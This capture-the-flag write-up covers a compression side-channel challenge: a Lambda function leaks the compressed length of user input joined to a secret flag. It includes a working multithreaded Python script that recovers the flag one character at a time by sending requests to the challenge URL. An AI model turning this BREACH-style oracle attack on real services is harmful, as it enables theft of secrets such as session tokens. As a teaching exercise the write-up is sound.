# Just a day at the breach

Solved by: @vicevirus

## Question:
```
import os
import json
import zlib

def lambda_handler(event, context):
    try:
        payload=bytes.fromhex(event["queryStringParameters"]["payload"])
        flag = os.environ["flag"].encode()
        message = b"Your payload is: %b\nThe flag is: %b" % (payload, flag)
        compressed_length = len(zlib.compress(message,9))
    except ValueError as e:
        return {'statusCode': 500, "error": str(e)}

    return {
        'statusCode': 200,
        'body': json.dumps({"sniffed": compressed_length})
    }
```

It's a little more crypto than web, but I know the exploit from a web defcon talk ages ago. This is a common web exploit for network sniffers.

## Solution:
char by char brute. the smallest length is the correct character

```
import requests
import string
from concurrent.futures import ThreadPoolExecutor, as_completed

url = "https://55nlig2es7hyrhvzcxzboyp4xe0nzjrc.lambda-url.us-east-1.on.aws/"
known_flag = "udctf"
possible_chars = string.ascii_letters + string.digits + "{}_"

def get_compressed_length(char):
    payload = known_flag + char
    
    hex_payload = payload.encode().hex()
    response = requests.get(url, params={'payload': hex_payload})
    return char, response.json().get('sniffed')

while True:
    min_length = float('inf')
    next_char = ''

    with ThreadPoolExecutor(max_workers=10) as executor:  # Adjust max_workers based on network capacity
        futures = [executor.submit(get_compressed_length, char) for char in possible_chars]

        for future in as_completed(futures):
            char, compressed_length = future.result()
            if compressed_length < min_length:
                min_length = compressed_length
                next_char = char

    if next_char:
        known_flag += next_char
        print(f"Current flag: {known_flag}")
    else:
        break
        ```

**Flag:`udctf{huffm4n_br34ched_l3t5_go`** 
